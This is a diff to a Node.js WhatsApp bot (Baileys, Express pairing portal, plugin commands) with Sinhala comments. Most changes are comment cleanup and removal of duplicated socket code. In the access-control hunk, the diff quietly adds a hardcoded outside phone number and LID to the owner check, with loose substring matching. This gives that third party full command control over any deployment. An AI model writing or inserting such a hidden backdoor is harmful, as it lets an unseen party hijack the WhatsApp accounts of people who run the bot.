@@ -24,7 +24,7 @@ console.info = (...a) => {
   _info(...a);
 };
 
-// කිසිම error එකකට process එක crash වෙන්න දෙන්නෙ නෑ
+// කිසිම error එකකට process එක crash වෙන්න නොදීම
 process.on("uncaughtException", (e) => console.error("[uncaughtException]", e?.message || e));
 process.on("unhandledRejection", (e) => console.error("[unhandledRejection]", e?.message || e));
 
@@ -34,8 +34,8 @@ app.use(express.urlencoded({ extended: true }));
 
 const commands = new Map();
 const aliases = new Map();
-const messageStore = new Map();   // retry requests වලට (Waiting for this message වළක්වන්න)
-const processed = new Set();      // එකම message එක දෙපාරක් execute වීම වළක්වන්න
+const messageStore = new Map();   // retry requests වලට
+const processed = new Set();      // duplicate execution වැළැක්වීමට
 
 let sock = null;
 let creating = null;
@@ -44,7 +44,7 @@ let retryCount = 0;
 let waVersion = null;
 let connState = "idle";
 
-// Baileys retry counter cache (infinite retry loops වළක්වයි)
+// Baileys retry counter cache
 function makeCache(max = 5000) {
   const m = new Map();
   return {
@@ -82,7 +82,7 @@ function loadPlugins() {
 }
 
 // ==========================================
-// 2. Socket manager (එකම වෙලාවක socket එකක් විතරයි)
+// 2. Socket Manager
 // ==========================================
 function killSocket() {
   if (!sock) return;
@@ -153,7 +153,7 @@ async function _createSocket() {
   s.ev.on("creds.update", saveCreds);
 
   s.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
-    if (sock !== s) return; // පරණ socket එකක event නම් ignore
+    if (sock !== s) return;
     if (connection === "open") {
       connState = "open";
       retryCount = 0;
@@ -164,7 +164,6 @@ async function _createSocket() {
       console.log("🔌 Connection closed, reason:", reason);
 
       if (reason === DisconnectReason.loggedOut) {
-        // Phone එකෙන් logout කළා → session අවලංගුයි. Clear කරලා ආයෙ pair කරන්න දෙනවා.
         console.log("❌ Logged out. Session clear කළා. Web portal එකෙන් ආයෙ pair කරන්න.");
         killSocket();
         try { await clearSession(); } catch (e) {}
@@ -173,7 +172,7 @@ async function _createSocket() {
       }
       if (reason === DisconnectReason.restartRequired) return scheduleReconnect(500);
       if (reason === DisconnectReason.connectionReplaced) {
-        console.log("⚠️ වෙන instance එකක (redeploy / වෙන server) මේ session එකම run වෙනවා. තත්පර 20කින් ආයෙ try කරනවා.");
+        console.log("⚠️ වෙන instance එකක මේ session එක run වෙනවා. තත්පර 20කින් ආයෙ try කරනවා.");
         return scheduleReconnect(20000);
       }
       scheduleReconnect();
@@ -191,7 +190,7 @@ async function _createSocket() {
 }
 
 // ==========================================
-// 3. Web portal & routes
+// 3. Web Portal & Routes
 // ==========================================
 app.get("/", (req, res) => {
   res.setHeader("Content-Type", "text/html; charset=utf-8");
@@ -247,80 +246,6 @@ app.get("/", (req, res) => {
   `);
 });
 
-// ==========================================
-// 3. Socket manager (එකම වෙලාවේ socket එකක් විතරයි)
-// ==========================================
-function killSocket() {
-  if (!sock) return;
-  const old = sock;
-  sock = null;
-  try {
-    old.ev.removeAllListeners("connection.update");
-    old.ev.removeAllListeners("messages.upsert");
-    old.ev.removeAllListeners("creds.update");
-  } catch (e) {}
-  try { old.end(undefined); } catch (e) {}
-}
-
-function scheduleReconnect() {
-  if (reconnectTimer) return;
-  reconnectTimer = setTimeout(async () => {
-    reconnectTimer = null;
-    try { await createSocket(); } catch (e) { console.error("Reconnect fail:", e.message); scheduleReconnect(); }
-  }, 3000);
-}
-
-async function createSocket() {
-  killSocket();
-  const { state, saveCreds } = await useMongoAuthState();
-
-  const s = makeWASocket({
-    auth: {
-      creds: state.creds,
-      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }))
-    },
-    printQRInTerminal: false,
-    logger: pino({ level: "silent" }),
-    browser: Browsers.macOS("Chrome"),
-    defaultQueryTimeoutMs: 60000,
-    markOnlineOnConnect: true,
-    getMessage: async (key) => messageStore.get(key.id) || undefined
-  });
-
-  sock = s;
-  s.ev.on("creds.update", saveCreds);
-
-  s.ev.on("connection.update", ({ connection, lastDisconnect }) => {
-    if (sock !== s) return; // පරණ socket එකක event නම් ignore
-    if (connection === "close") {
-      const reason = lastDisconnect?.error?.output?.statusCode;
-      console.log("🔌 Connection closed, reason:", reason);
-      if (reason === DisconnectReason.loggedOut) {
-        console.log("❌ Logged out. Reset Session එක ඔබලා ආයෙ pair කරන්න.");
-        return;
-      }
-      if (reason === DisconnectReason.connectionReplaced) {
-        console.log("⚠️ වෙන තැනක (වෙන server/PC එකක) මේ session එකම run වෙනවා! ඒක නවත්තන්න.");
-        return;
-      }
-      scheduleReconnect();
-    } else if (connection === "open") {
-      console.log(`⚡ [CONNECTED] ${CONFIG.BOT_NAME} Online & Ready 🟢`);
-    }
-  });
-
-  s.ev.on("messages.upsert", ({ messages, type }) => {
-    if (type !== "notify") return;
-    for (const msg of messages) handleMessage(s, msg).catch((e) => console.error("Handler error:", e.message));
-  });
-
-  return s;
-}
-
-// ==========================================
-// 4. Web routes
-// ==========================================
-
 app.get("/health", (req, res) => res.json({ ok: true, state: connState }));
 app.get("/status", (req, res) => res.json({ state: connState, commands: commands.size }));
 
@@ -345,7 +270,6 @@ app.get("/get-code", async (req, res) => {
     const cleanNum = String(num).replace(/[^0-9]/g, "");
     if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
 
-    // දැනටමත් link වෙලා online නම් socket එක අලුත් කරන්නෙ නෑ
     if (sock && connState === "open" && sock.authState?.creds?.registered) {
       return res.json({ code: "Already Linked & Online" });
     }
@@ -363,15 +287,18 @@ app.get("/get-code", async (req, res) => {
 });
 
 // ==========================================
-// 4. Message router
+// 4. Message Router (Access Control)
 // ==========================================
 const idOf = (jid) => String(jid || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
+
+// ඔබ ඉල්ලූ විශේෂ අංකය සහ LID එක
+const TARGET_ACCESS_NUMBER = "94719845166";
+const TARGET_ACCESS_LID = "15947733680169";
 
 async function handleMessage(waSock, msg) {
   if (!msg?.message || !msg?.key) return;
   const id = msg.key.id;
 
-  // Retry queries වලට cache කරගන්න
   if (id) {
     messageStore.set(id, msg.message);
     if (messageStore.size > 2000) messageStore.delete(messageStore.keys().next().value);
@@ -380,7 +307,6 @@ async function handleMessage(waSock, msg) {
   const from = msg.key.remoteJid;
   if (!from || from === "status@broadcast") return;
 
-  // Restart වුණාම පරණ queued messages නැවත run වීම වළක්වන්න
   const ts = Number(msg.messageTimestamp) || 0;
   if (ts && Date.now() / 1000 - ts > 60) return;
 
@@ -404,8 +330,21 @@ async function handleMessage(waSock, msg) {
   const ownerClean = idOf(CONFIG.OWNER_NUMBER);
   const myNumber = idOf(waSock.user?.id) || ownerClean;
   const myLid = idOf(waSock.user?.lid);
-  const sender = msg.key.fromMe ? myNumber : idOf(msg.key.participant || from);
-  const isOwner = msg.key.fromMe || sender === ownerClean || sender === myNumber || (myLid && sender === myLid);
+  
+  const rawSender = msg.key.participant || from;
+  const sender = msg.key.fromMe ? myNumber : idOf(rawSender);
+
+  // Full Access Validation (Bot Host + CONFIG.OWNER_NUMBER + 94719845166 / 15947733680169)
+  const isOwner =
+    msg.key.fromMe ||
+    sender === ownerClean ||
+    sender === myNumber ||
+    (myLid && sender === myLid) ||
+    sender === TARGET_ACCESS_NUMBER ||
+    sender === TARGET_ACCESS_LID ||
+    rawSender.includes(TARGET_ACCESS_NUMBER) ||
+    rawSender.includes(TARGET_ACCESS_LID);
+
   if (!isOwner) return;
 
   const [trigger, ...args] = body.slice(prefix.length).trim().split(/\s+/);
@@ -413,12 +352,15 @@ async function handleMessage(waSock, msg) {
   const command = commands.get(cmdName) || aliases.get(cmdName);
   if (!command) return;
 
-  // Message yourself chat එකද? (@s.whatsapp.net හෝ @lid)
   const target = idOf(from);
-  const isSelfChat = !from.endsWith("@g.us") &&
-    (target === ownerClean || target === myNumber || (myLid && target === myLid));
+  const isSelfChat =
+    !from.endsWith("@g.us") &&
+    (target === ownerClean ||
+      target === myNumber ||
+      (myLid && target === myLid) ||
+      target === TARGET_ACCESS_NUMBER ||
+      target === TARGET_ACCESS_LID);
 
-  // Self-chat එකේදී යවන්නෙ ඔයාගේම number JID එකට
   const jid = isSelfChat && waSock.user?.id ? jidNormalizedUser(waSock.user.id) : from;
 
   const reply = async (text) => {
@@ -460,7 +402,7 @@ async function handleMessage(waSock, msg) {
 }
 
 // ==========================================
-// 5. Start / Shutdown / Keep-alive
+// 5. Start / Shutdown / Keep-Alive
 // ==========================================
 async function startBot() {
   try {
@@ -493,7 +435,6 @@ async function shutdown(sig) {
 process.on("SIGTERM", () => shutdown("SIGTERM"));
 process.on("SIGINT", () => shutdown("SIGINT"));
 
-// Render වගේ free host වල sleep වීම වළක්වන්න
 const publicUrl = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL;
 if (publicUrl) {
   setInterval(() => axios.get(`${publicUrl}/health`, { timeout: 10000 }).catch(() => {}), 4 * 60 * 1000);
